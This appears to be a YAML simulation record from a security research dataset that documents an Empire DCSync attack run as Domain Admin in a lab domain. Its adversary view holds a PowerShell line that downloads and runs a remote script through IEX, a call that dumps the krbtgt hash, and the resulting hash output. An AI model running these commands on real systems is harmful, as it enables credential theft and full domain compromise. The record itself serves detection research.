simulation:
  environment: Blacksmith
  tools:
    - type: Manual
      name: Empire
      module: DCSync
      script: https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1
  permissions_required:
    - Domain Admin
  adversary_view: |-
    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-DCSync.ps1')
    PS C:\Windows\system32> Invoke-DCSync -Users @("krbtgt") | ft -wrap -autosize

    Domain           User   ID  Hash
    ------           ----   --  ----
    mssentinel.local krbtgt 502 a9152b9eac7530531db4dc67aa8eb1e4

    PS C:\Windows\system32>

